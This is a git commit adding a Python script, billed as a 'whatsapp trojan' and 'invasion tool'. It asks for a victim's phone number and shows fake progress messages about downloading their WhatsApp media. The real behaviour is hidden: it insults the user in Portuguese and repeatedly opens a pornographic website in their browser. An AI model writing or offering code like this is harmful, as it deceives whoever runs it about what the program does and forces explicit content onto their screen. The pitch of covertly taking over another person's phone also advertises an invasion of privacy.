f218de6d2dc5f8563cc302f8498321db240e3b43
Fatal-SEC <69664048+Fatal-SEC@users.noreply.github.com>
2020-08-14 01:58:15 -0300

    whatsapp trojan

---
+++ WhatsappDARK.py
@@ -0,0 +1,80 @@
+# -*- coding: utf-8 -*-
+# -*- coding: utf-8 -*-
+print '\033[1;91m'+'''
+·▄▄▄▄   ▄▄▄· ▄▄▄  ▄ •▄ 
+██▪ ██ ▐█ ▀█ ▀▄ █·█▌▄▌▪
+▐█· ▐█▌▄█▀▀█ ▐▀▀▄ ▐▀▀▄·
+██. ██ ▐█ ▪▐▌▐█•█▌▐█.█▌
+▀▀▀▀▀•  ▀  ▀ .▀  ▀·▀  ▀
+
+'''+'\033[0;0m'
+
+
+
+
+import time
+import os
+import webbrowser
+print ""
+print '\033[31m'+'Dark, powerful whatsapp invasion tool'+'\033[0;0m'
+print ""
+raw_input("from the moment you put the victim's information here you've got her whatsapp in your hands, do you want to continue? ")
+print "ok"
+print ""
+time.sleep(2) # Sleep for 1 seconds
+print ""
+nmr = raw_input("what victim's number?:")
+print '\033[31m'+'victim number is: ?'+'\033[0;0m', nmr
+s = raw_input("yes or no?: ")
+time.sleep(3) # Sleep for 1 seconds
+print ""
+print '\033[31m'+'reading backup file and message from'+'\033[0;0m', nmr
+print ""
+time.sleep(2) # Sleep for 1 seconds
+print '\033[1;92m'+'20%'+'\033[0;0m'
+print ""
+time.sleep(3) # Sleep for 1 seconds
+print '\033[1;92m'+'40%'+'\033[0;0m'
+print ""
+time.sleep(1) # Sleep for 1 seconds
+print '\033[1;92m'+'70%'+'\033[0;0m'
+print ""
+time.sleep(1) # Sleep for 1 seconds
+print '\033[1;92m'+'90%'+'\033[0;0m'
+print ""
+time.sleep(1) # Sleep for 1 seconds
+print '\033[1;92m'+'100%'+'\033[0;0m'
+print ""
+time.sleep(4) # Sleep for 1 seconds
+print '\033[1;92m'+'Whatsapp photos...'+'\033[0;0m'
+time.sleep(2) # Sleep for 1 seconds
+print ""
+print '\033[1;94m'+'Found! downloading...'+'\033[0;0m'
+print ""
+time.sleep(4) # Sleep for 1 seconds
+print '\033[1;92m'+'Whatsapp audio...'+'\033[0;0m'
+time.sleep(2) # Sleep for 1 seconds
+print ""
+print '\033[1;94m'+'Found! downloading...'+'\033[0;0m'
+print ""
+time.sleep(4) # Sleep for 1 seconds
+print '\033[1;92m'+'Whatsapp stickers...'+'\033[0;0m'
+time.sleep(2) # Sleep for 1 seconds
+print ""
+print '\033[1;94m'+'Found! downloading...'+'\033[0;0m'
+print ""
+time.sleep(2)
+print '\033[1;92m'+'the backup was found, as of this moment you are with whatsapp of'+'\033[0;0m' + nmr
+raw_input('\033[1;92m'+'wanting to continue anyway?'+'\033[0;0m')
+print ""
+time.sleep(3)
+print "perai, você realmente pensou que ia invadir o celular de alguem? KKKKKKKKKKKKKKKKKKKKKKKK"
+time.sleep(2) # Sleep for 1 seconds
+msg = 'vai se foder nmrl kkkk'
+
+for i in range(9):
+    print(msg)
+
+print "vou encher teu PC de pornografia agora seu fodido KKKK"
+for i in range(10):
+    webbrowser.open('https://xvideos.com')
